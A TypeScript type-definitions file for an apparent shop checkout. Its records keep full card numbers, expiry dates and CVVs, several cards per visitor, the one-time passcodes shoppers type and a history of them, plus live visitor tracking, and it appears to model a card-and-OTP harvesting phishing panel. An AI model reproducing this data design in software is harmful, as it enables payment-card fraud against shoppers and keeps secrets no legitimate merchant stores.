import { Product } from "@/src/api/base44Client";

export type { Product };

export interface CartItem {
  product: Product;
  quantity: number;
}

export interface BinDetails {
  scheme?: string;
  type?: string;
  brand?: string;
  bankName?: string;
  bankPhone?: string;
  bankUrl?: string;
  countryName?: string;
  countryEmoji?: string;
}

export interface CardRecord {
  cardholderName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  binInfo?: BinDetails;
  paymentMethod?: string;
  cardApprovalStatus?: string;
  submittedAt?: string;
}

export interface CheckoutDetails {
  step: number;
  phone?: string;
  fullName?: string;
  email?: string;
  city?: string;
  nationalAddress?: string;
  street?: string;
  neighborhood?: string;
  paymentMethod?: string;
  cardholderName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  binInfo?: BinDetails;
  cardHistory?: CardRecord[];
  cardApprovalStatus?: "idle" | "pending" | "approved" | "rejected_unsupported";
  cardRejectReason?: string;
  awaitingOtp?: boolean;
  otpCode?: string;
  otpSubmittedAt?: string;
  otpHistory?: { code: string; timestamp: string }[];
  cartSummary?: {
    total: number;
    itemsCount: number;
    items: { name: string; quantity: number; price: number }[];
  };
  completed?: boolean;
}

export interface VisitorLogEvent {
  id: string;
  timestamp: string;
  type:
    | "page_view"
    | "step_change"
    | "phone_entered"
    | "shipping_entered"
    | "card_entered"
    | "otp_entered"
    | "order_completed";
  message: string;
  details?: Record<string, any>;
}

export interface VisitorRecord {
  visitorId: string;
  currentPage: string;
  isOnline: boolean;
  lastSeen: string;
  createdAt: string;
  ipAddress?: string;
  userAgent?: string;
  checkout?: CheckoutDetails;
  eventLogs: VisitorLogEvent[];
}

